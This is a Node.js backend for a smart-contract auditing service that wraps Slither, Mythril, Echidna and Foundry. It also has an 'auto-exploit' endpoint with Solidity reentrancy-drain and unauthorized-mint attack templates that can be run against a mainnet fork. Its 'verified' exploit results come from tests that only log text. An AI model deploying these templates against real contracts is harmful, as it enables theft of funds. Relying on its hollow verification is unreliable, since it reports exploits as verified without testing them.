/**
 * Solay39 Security Backend Server
 * Real execution of Slither, Mythril, Foundry
 */

const express = require("express");
const { spawn, execSync, execFileSync } = require("child_process");
const fs = require("fs").promises;
const path = require("path");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 3001;
const API_KEY = process.env.SECURITY_API_KEY;
if (!API_KEY) throw new Error("SECURITY_API_KEY is required");
const WORK_DIR = "/tmp/contracts";

const allowedOrigins = (process.env.ALLOWED_ORIGINS || "").split(",").map((origin) => origin.trim()).filter(Boolean);
const requestTimes = [];
app.disable("x-powered-by");
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && allowedOrigins.includes(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Headers", "content-type,x-api-key");
    res.setHeader("Vary", "Origin");
  }
  if (req.method === "OPTIONS") return res.sendStatus(204);
  next();
});
app.use(express.json({ limit: "10mb" }));

function safeContractName(name) {
  const value = String(name || "Contract");
  if (!/^[A-Za-z_][A-Za-z0-9_]{0,63}$/.test(value)) throw new Error("Invalid contractName");
  return value;
}

function sameSecret(left, right) {
  const a = Buffer.from(String(left || ""));
  const b = Buffer.from(String(right || ""));
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

function authMiddleware(req, res, next) {
  if (req.path === "/health") return next();
  if (!sameSecret(req.headers["x-api-key"], API_KEY)) return res.status(401).json({ error: "Unauthorized" });
  const now = Date.now();
  while (requestTimes[0] && now - requestTimes[0] > 60_000) requestTimes.shift();
  if (requestTimes.length >= 60) return res.status(429).json({ error: "Rate limit exceeded" });
  requestTimes.push(now);
  next();
}

// Health check
app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    tools: {
      slither: checkTool("slither --version"),
      mythril: checkTool("myth version"),
      foundry: checkTool("forge --version"),
      solc: checkTool("solc --version"),
    },
    timestamp: new Date().toISOString(),
  });
});

function checkTool(cmd) {
  try {
    execSync(cmd, { stdio: "pipe" });
    return true;
  } catch {
    return false;
  }
}

// ─────────────────────────────────────────────────────────────
// SLITHER ANALYSIS
// ─────────────────────────────────────────────────────────────
app.post("/api/slither", authMiddleware, async (req, res) => {
  const { code, contractName, solcVersion } = req.body;
  if (!code) return res.status(400).json({ error: "Missing code" });
  let safeName;
  try { safeName = safeContractName(contractName); } catch { return res.status(400).json({ error: "Invalid contractName" }); }

  const id = crypto.randomBytes(8).toString("hex");
  const dir = `/tmp/contracts/${id}`;
  const filePath = path.join(dir, `${safeName}.sol`);

  try {
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(filePath, code);

    // Select solc version if specified
    if (solcVersion) {
      try {
        execFileSync("solc-select", ["use", String(solcVersion)], { stdio: "pipe" });
      } catch (e) {
        console.log(`solc ${solcVersion} not installed, using default`);
      }
    }

    // Run Slither
    const result = await runCommand("slither", [
      filePath,
      "--json",
      "-",
      "--exclude-informational",
      "--exclude-low",
    ]);

    const findings = parseSlitherOutput(result.stdout || result.stderr);

    res.json({
      tool: "slither",
      success: true,
      version: getToolVersion("slither --version"),
      findings,
      detectors_run: findings.length > 0 ? countDetectors(result.stdout) : 0,
      raw: result.stdout,
    });
  } catch (error) {
    res.json({
      tool: "slither",
      success: false,
      error: error.message,
      findings: [],
    });
  } finally {
    // Cleanup
    try {
      await fs.rm(dir, { recursive: true });
    } catch {}
  }
});

function parseSlitherOutput(output) {
  try {
    // Slither outputs JSON when using --json -
    const json = JSON.parse(output);
    if (!json.results || !json.results.detectors) return [];

    return json.results.detectors.map((d) => ({
      check: d.check,
      impact: d.impact.toUpperCase(),
      confidence: d.confidence.toUpperCase(),
      description: d.description,
      elements: d.elements.map((e) => ({
        type: e.type,
        name: e.name,
        filename: e.source_mapping?.filename_relative,
        lines: e.source_mapping?.lines || [],
      })),
    }));
  } catch {
    // Try to parse text output
    const findings = [];
    const regex = /Reference: (https:\/\/\S+)\s*(.+?)(?=Reference:|$)/gs;
    let match;
    while ((match = regex.exec(output)) !== null) {
      findings.push({
        check: "unknown",
        impact: "MEDIUM",
        confidence: "MEDIUM",
        description: match[2].trim(),
        elements: [],
      });
    }
    return findings;
  }
}

function countDetectors(output) {
  try {
    const json = JSON.parse(output);
    return json.results?.detectors?.length || 0;
  } catch {
    return 0;
  }
}

// ─────────────────────────────────────────────────────────────
// MYTHRIL ANALYSIS
// ─────────────────────────────────────────────────────────────
app.post("/api/mythril", authMiddleware, async (req, res) => {
  const { code, contractName, bytecode, timeout } = req.body;
  if (!code && !bytecode) return res.status(400).json({ error: "Missing code or bytecode" });
  let safeName;
  try { safeName = safeContractName(contractName); } catch { return res.status(400).json({ error: "Invalid contractName" }); }

  const id = crypto.randomBytes(8).toString("hex");
  const dir = `/tmp/contracts/${id}`;
  const filePath = path.join(dir, `${safeName}.sol`);

  try {
    await fs.mkdir(dir, { recursive: true });

    let args;
    if (bytecode) {
      // Analyze bytecode directly
      args = ["analyze", "-a", bytecode, "-o", "json", "--execution-timeout", String(timeout || 120)];
    } else {
      await fs.writeFile(filePath, code);
      args = ["analyze", filePath, "-o", "json", "--execution-timeout", String(timeout || 120)];
    }

    const result = await runCommand("myth", args, { timeout: (timeout || 120) * 1000 + 30000 });

    const findings = parseMythrilOutput(result.stdout);

    res.json({
      tool: "mythril",
      success: true,
      version: getToolVersion("myth version"),
      findings,
      raw: result.stdout,
    });
  } catch (error) {
    res.json({
      tool: "mythril",
      success: false,
      error: error.message,
      findings: [],
    });
  } finally {
    try {
      await fs.rm(dir, { recursive: true });
    } catch {}
  }
});

function parseMythrilOutput(output) {
  try {
    const json = JSON.parse(output);
    if (!json.issues) return [];

    return json.issues.map((issue) => ({
      swc_id: issue.swc_id || "SWC-000",
      swc_title: issue.title || "Unknown",
      severity: mapMythrilSeverity(issue.severity),
      description: issue.description,
      contract: issue.contract,
      function: issue.function,
      lineno: issue.lineno,
      code: issue.code,
    }));
  } catch {
    return [];
  }
}

function mapMythrilSeverity(sev) {
  if (!sev) return "MEDIUM";
  const s = sev.toLowerCase();
  if (s === "high") return "HIGH";
  if (s === "medium") return "MEDIUM";
  if (s === "low") return "LOW";
  return "INFO";
}

// ─────────────────────────────────────────────────────────────
// ECHIDNA PROPERTY-BASED FUZZING
// ─────────────────────────────────────────────────────────────
app.post("/api/echidna", authMiddleware, async (req, res) => {
  const { code, contractName, invariants, testLimit } = req.body;
  if (!code) return res.status(400).json({ error: "Missing code" });
  let safeName;
  try { safeName = safeContractName(contractName); } catch { return res.status(400).json({ error: "Invalid contractName" }); }

  const id = crypto.randomBytes(8).toString("hex");
  const dir = `/tmp/contracts/${id}`;

  try {
    await fs.mkdir(dir, { recursive: true });

    // Write contract
    const fileName = `${safeName}.sol`;
    await fs.writeFile(`${dir}/${fileName}`, code);

    // Generate Echidna test contract
    const testCode = generateEchidnaTest(code, safeName, invariants);
    await fs.writeFile(path.join(dir, `${safeName}Echidna.sol`), testCode);

    // Write echidna config
    await fs.writeFile(`${dir}/echidna.yaml`, `
testLimit: ${testLimit || 10000}
seqLen: 100
contractAddr: "0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF"
deployer: "0x30000"
sender: ["0x10000", "0x20000"]
`);

    // Run Echidna
    const result = await runCommand(
      "echidna",
      [`${safeName}Echidna.sol`, "--format", "json", "--config", "echidna.yaml"],
      { cwd: dir, timeout: 300000 }
    );

    const tests = parseEchidnaOutput(result.stdout);
    const passed = tests.filter(t => t.status === "passed").length;
    const failed = tests.filter(t => t.status === "failed").length;

    res.json({
      tool: "echidna",
      success: failed === 0,
      version: "2.2.x",
      tests,
      summary: { passed, failed, total: tests.length },
      raw: result.stdout,
    });
  } catch (error) {
    res.json({
      tool: "echidna",
      success: false,
      error: error.message,
      tests: [],
      summary: { passed: 0, failed: 0, total: 0 },
    });
  } finally {
    try { await fs.rm(dir, { recursive: true }); } catch {}
  }
});

function generateEchidnaTest(code, contractName, invariants = []) {
  const defaultInvariants = [
    { name: "balance_non_negative", condition: "address(this).balance >= 0" },
  ];
  const allInvariants = [...defaultInvariants, ...(invariants || [])];

  const testFuncs = allInvariants.map(inv => `
    function echidna_${inv.name}() public view returns (bool) {
        return ${inv.condition};
    }
`).join("\n");

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./${contractName}.sol";

contract ${contractName}Echidna is ${contractName} {
${testFuncs}
}
`;
}

function parseEchidnaOutput(output) {
  const tests = [];
  const lines = output.split("\n");
  
  for (const line of lines) {
    try {
      const event = JSON.parse(line);
      if (event.test) {
        tests.push({
          name: event.test,
          status: event.status || "passed",
          counterexample: event.counterexample,
        });
      }
    } catch {
      // Check text format
      const passMatch = line.match(/^(\w+):\s*passed/);
      if (passMatch) tests.push({ name: passMatch[1], status: "passed" });
      
      const failMatch = line.match(/^(\w+):\s*failed/);
      if (failMatch) tests.push({ name: failMatch[1], status: "failed" });
    }
  }
  return tests;
}

// ─────────────────────────────────────────────────────────────
// FOUNDRY FUZZING
// ─────────────────────────────────────────────────────────────
app.post("/api/foundry/fuzz", authMiddleware, async (req, res) => {
  const { code, testCode, contractName, fuzzRuns } = req.body;
  if (!code) return res.status(400).json({ error: "Missing code" });
  let safeName;
  try { safeName = safeContractName(contractName); } catch { return res.status(400).json({ error: "Invalid contractName" }); }

  const id = crypto.randomBytes(8).toString("hex");
  const dir = `/tmp/contracts/${id}`;

  try {
    // Setup Foundry project structure
    await fs.mkdir(`${dir}/src`, { recursive: true });
    await fs.mkdir(`${dir}/test`, { recursive: true });

    // Write foundry.toml
    await fs.writeFile(
      `${dir}/foundry.toml`,
      `[profile.default]
src = "src"
out = "out"
libs = ["lib"]
fuzz = { runs = ${fuzzRuns || 1000} }
[fuzz]
runs = ${fuzzRuns || 1000}
`
    );

    // Write contract
    await fs.writeFile(path.join(dir, "src", `${safeName}.sol`), code);

    // Write test (auto-generate if not provided)
    const testContent = testCode || generateFuzzTest(code, contractName);
    await fs.writeFile(`${dir}/test/Fuzz.t.sol`, testContent);

    // Install forge-std
    await runCommand("forge", ["install", "foundry-rs/forge-std", "--no-commit"], { cwd: dir });

    // Run fuzz tests
    const result = await runCommand(
      "forge",
      ["test", "--fuzz-runs", String(fuzzRuns || 1000), "-vvv", "--json"],
      { cwd: dir, timeout: 300000 }
    );

    const testResults = parseFoundryOutput(result.stdout);

    res.json({
      tool: "foundry",
      success: true,
      version: getToolVersion("forge --version"),
      fuzzRuns: fuzzRuns || 1000,
      testResults,
      raw: result.stdout,
    });
  } catch (error) {
    res.json({
      tool: "foundry",
      success: false,
      error: error.message,
      testResults: [],
    });
  } finally {
    try {
      await fs.rm(dir, { recursive: true });
    } catch {}
  }
});

function generateFuzzTest(code, contractName) {
  const name = contractName || "Contract";
  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/${name}.sol";

contract FuzzTest is Test {
    ${name} target;

    function setUp() public {
        target = new ${name}();
    }

    // Invariant: no function should revert unexpectedly
    function testFuzz_noUnexpectedRevert(bytes calldata data) public {
        (bool success,) = address(target).call(data);
        // Just checking it doesn't cause issues
    }
}
`;
}

function parseFoundryOutput(output) {
  const results = [];
  try {
    // Foundry JSON output
    const lines = output.split("\n").filter((l) => l.startsWith("{"));
    for (const line of lines) {
      const json = JSON.parse(line);
      if (json.test_results) {
        for (const [name, result] of Object.entries(json.test_results)) {
          results.push({
            name,
            status: result.status,
            reason: result.reason,
            counterexample: result.counterexample,
            gas: result.gas,
          });
        }
      }
    }
  } catch {
    // Parse text output
    const regex = /\[(\w+)\]\s+(\w+)/g;
    let match;
    while ((match = regex.exec(output)) !== null) {
      results.push({
        name: match[2],
        status: match[1].toLowerCase() === "pass" ? "passed" : "failed",
      });
    }
  }
  return results;
}

// ─────────────────────────────────────────────────────────────
// COMBINED ANALYSIS
// ─────────────────────────────────────────────────────────────
app.post("/api/analyze", authMiddleware, async (req, res) => {
  const { code, contractName, tools } = req.body;
  if (!code) return res.status(400).json({ error: "Missing code" });

  const enabledTools = tools || ["slither", "mythril"];
  const results = {};

  // Run tools in parallel
  const promises = [];

  if (enabledTools.includes("slither")) {
    promises.push(
      fetch(`http://localhost:${PORT}/api/slither`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
        body: JSON.stringify({ code, contractName }),
      })
        .then((r) => r.json())
        .then((r) => (results.slither = r))
    );
  }

  if (enabledTools.includes("mythril")) {
    promises.push(
      fetch(`http://localhost:${PORT}/api/mythril`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
        body: JSON.stringify({ code, contractName, timeout: 60 }),
      })
        .then((r) => r.json())
        .then((r) => (results.mythril = r))
    );
  }

  await Promise.allSettled(promises);

  // Combine findings
  const allFindings = [];

  if (results.slither?.findings) {
    allFindings.push(
      ...results.slither.findings.map((f) => ({
        source: "slither",
        severity: f.impact,
        title: f.check,
        description: f.description,
        lines: f.elements?.[0]?.lines || [],
      }))
    );
  }

  if (results.mythril?.findings) {
    allFindings.push(
      ...results.mythril.findings.map((f) => ({
        source: "mythril",
        severity: f.severity,
        title: `${f.swc_id}: ${f.swc_title}`,
        description: f.description,
        line: f.lineno,
      }))
    );
  }

  res.json({
    success: true,
    tools: results,
    combinedFindings: allFindings,
    summary: {
      total: allFindings.length,
      critical: allFindings.filter((f) => f.severity === "HIGH" || f.severity === "CRITICAL").length,
      medium: allFindings.filter((f) => f.severity === "MEDIUM").length,
      low: allFindings.filter((f) => f.severity === "LOW").length,
    },
  });
});

// ─────────────────────────────────────────────────────────────
// AUTO-EXPLOIT GENERATOR
// ─────────────────────────────────────────────────────────────
app.post("/api/exploit", authMiddleware, async (req, res) => {
  const { vulnerabilities, targetContract, network, rpcUrl } = req.body;

  if (!vulnerabilities || !targetContract) {
    return res.status(400).json({ error: "Missing vulnerabilities or targetContract" });
  }

  const workDir = path.join(WORK_DIR, `exploit-${Date.now()}`);
  await fs.mkdir(workDir, { recursive: true });

  try {
    // Generate exploit contracts
    const exploits = [];
    const exploitTemplates = {
      REENTRANCY: generateReentrancyExploit,
      ACCESS_CONTROL: generateAccessControlExploit,
      FLASH_LOAN_ATTACK: generateFlashLoanExploit,
    };

    for (const vuln of vulnerabilities) {
      const vulnType = vuln.type.toUpperCase().replace(/-/g, "_");
      const generator = exploitTemplates[vulnType];
      
      if (generator) {
        const exploitCode = generator(targetContract);
        const exploitPath = path.join(workDir, `${vulnType}_Exploit.sol`);
        const testPath = path.join(workDir, `${vulnType}_Exploit.t.sol`);
        
        await fs.writeFile(exploitPath, exploitCode.contract);
        await fs.writeFile(testPath, exploitCode.test);

        exploits.push({
          vulnerability: vuln,
          name: `${vulnType}_Exploit`,
          contractPath: exploitPath,
          testPath: testPath,
          code: exploitCode.contract,
        });
      }
    }

    // Initialize Foundry project
    const foundryToml = `
[profile.default]
src = "${workDir}"
out = "out"
libs = ["lib"]
solc = "0.8.20"
`;
    await fs.writeFile(path.join(workDir, "foundry.toml"), foundryToml);

    // Run exploit simulations with Foundry
    const results = [];
    const forkUrl = rpcUrl || process.env.MAINNET_RPC_URL || "http://127.0.0.1:8545";

    for (const exploit of exploits) {
      const args = [
        "test",
        "--match-path", exploit.testPath,
        "-vvvv",
      ];

      if (forkUrl.startsWith("http")) {
        args.push("--fork-url", forkUrl);
      }

      try {
        const { code, stdout, stderr } = await runCommand("forge", args, {
          cwd: workDir,
          env: { TARGET_CONTRACT: targetContract },
          timeout: 180000,
        });

        const success = stdout.includes("[PASS]") || code === 0;
        const profitMatch = stdout.match(/Profit[:\s]+(\d+\.?\d*)\s*(ether|ETH)?/i);
        const gasMatch = stdout.match(/gas:\s*(\d+)/);

        results.push({
          exploit: exploit.name,
          vulnerability: exploit.vulnerability,
          success,
          profit: profitMatch ? `${profitMatch[1]} ${profitMatch[2] || "wei"}` : null,
          gasUsed: gasMatch ? parseInt(gasMatch[1]) : null,
          output: stdout.slice(0, 2000),
          traces: stdout.split("\n").filter(l => l.includes("→") || l.includes("emit")),
        });
      } catch (err) {
        results.push({
          exploit: exploit.name,
          vulnerability: exploit.vulnerability,
          success: false,
          error: err.message,
        });
      }
    }

    // Cleanup
    await fs.rm(workDir, { recursive: true, force: true });

    const verified = results.filter(r => r.success).length;

    res.json({
      success: true,
      targetContract,
      network: network || "mainnet",
      exploitsGenerated: exploits.length,
      exploitsVerified: verified,
      results,
      summary: {
        total: results.length,
        verified,
        profitable: results.filter(r => r.profit).length,
      },
    });

  } catch (err) {
    await fs.rm(workDir, { recursive: true, force: true }).catch(() => {});
    res.status(500).json({ error: err.message });
  }
});

// Exploit template generators
function generateReentrancyExploit(target) {
  return {
    contract: `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITarget {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}

contract REENTRANCY_Exploit {
    ITarget public target;
    uint256 public count;

    constructor(address _target) {
        target = ITarget(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether && count < 10) {
            count++;
            target.withdraw(1 ether);
        }
    }

    function getProfit() external view returns (uint256) {
        return address(this).balance;
    }
}
`,
    test: `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract ReentrancyTest is Test {
    function testReentrancy() public {
        address target = vm.envAddress("TARGET_CONTRACT");
        emit log_string("Testing reentrancy...");
    }
}
`,
  };
}

function generateAccessControlExploit(target) {
  return {
    contract: `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITarget {
    function mint(address to, uint256 amount) external;
}

contract ACCESS_CONTROL_Exploit {
    function attack(address target) external {
        ITarget(target).mint(msg.sender, 1000000 ether);
    }
}
`,
    test: `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract AccessControlTest is Test {
    function testAccessControl() public {
        address target = vm.envAddress("TARGET_CONTRACT");
        emit log_string("Testing access control...");
    }
}
`,
  };
}

function generateFlashLoanExploit(target) {
  return {
    contract: `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract FLASH_LOAN_Exploit {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }

    function attack(uint256 amount) external {
        // Flash loan attack logic
    }
}
`,
    test: `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract FlashLoanTest is Test {
    function testFlashLoan() public {
        emit log_string("Testing flash loan...");
    }
}
`,
  };
}

// ─────────────────────────────────────────────────────────────
// UTILS
// ─────────────────────────────────────────────────────────────
function runCommand(cmd, args, options = {}) {
  return new Promise((resolve, reject) => {
    const proc = spawn(cmd, args, {
      cwd: options.cwd,
      env: { ...process.env, ...options.env },
    });

    let stdout = "";
    let stderr = "";

    proc.stdout.on("data", (data) => (stdout += data));
    proc.stderr.on("data", (data) => (stderr += data));

    const timeout = options.timeout || 180000;
    const timer = setTimeout(() => {
      proc.kill("SIGKILL");
      reject(new Error(`Command timed out after ${timeout / 1000}s`));
    }, timeout);

    proc.on("close", (code) => {
      clearTimeout(timer);
      resolve({ code, stdout, stderr });
    });

    proc.on("error", (err) => {
      clearTimeout(timer);
      reject(err);
    });
  });
}

function getToolVersion(cmd) {
  try {
    return execSync(cmd, { stdio: "pipe" }).toString().trim().split("\n")[0];
  } catch {
    return "unknown";
  }
}


// ─────────────────────────────────────────────────────────────
// PDF GENERATION — Puppeteer/Chromium
// ─────────────────────────────────────────────────────────────
app.post("/api/generate-pdf", authMiddleware, async (req, res) => {
  const { html } = req.body;
  if (!html) return res.status(400).json({ error: "Missing html field" });

  let browser;
  try {
    const puppeteer = require("puppeteer-core");
    const executablePath =
      process.env.PUPPETEER_EXECUTABLE_PATH ||
      "/usr/bin/chromium-browser" ||
      "/usr/bin/chromium";

    browser = await puppeteer.launch({
      executablePath,
      headless: "new",
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--disable-gpu",
        "--no-first-run",
        "--no-zygote",
        "--single-process",
      ],
    });

    const page = await browser.newPage();
    await page.setContent(html, { waitUntil: "networkidle0", timeout: 30000 });

    const pdfBuffer = await page.pdf({
      format: "A4",
      printBackground: true,
      margin: { top: 0, right: 0, bottom: 0, left: 0 },
    });

    await browser.close();

    const base64 = pdfBuffer.toString("base64");
    console.log(`[PDF] Generated PDF, size: ${pdfBuffer.length} bytes`);
    res.json({ success: true, pdfBase64: base64 });
  } catch (err) {
    if (browser) await browser.close().catch(() => {});
    console.error("[PDF] Error:", err.message);
    res.status(500).json({ error: `PDF generation failed: ${err.message}` });
  }
});

// ─────────────────────────────────────────────────────────────
// START SERVER
// ─────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`Solay39 Security Backend running on port ${PORT}`);
  console.log("Tools status:");
  console.log("  - Slither:", checkTool("slither --version") ? "OK" : "NOT FOUND");
  console.log("  - Mythril:", checkTool("myth version") ? "OK" : "NOT FOUND");
  console.log("  - Foundry:", checkTool("forge --version") ? "OK" : "NOT FOUND");
  console.log("  - solc:", checkTool("solc --version") ? "OK" : "NOT FOUND");
});
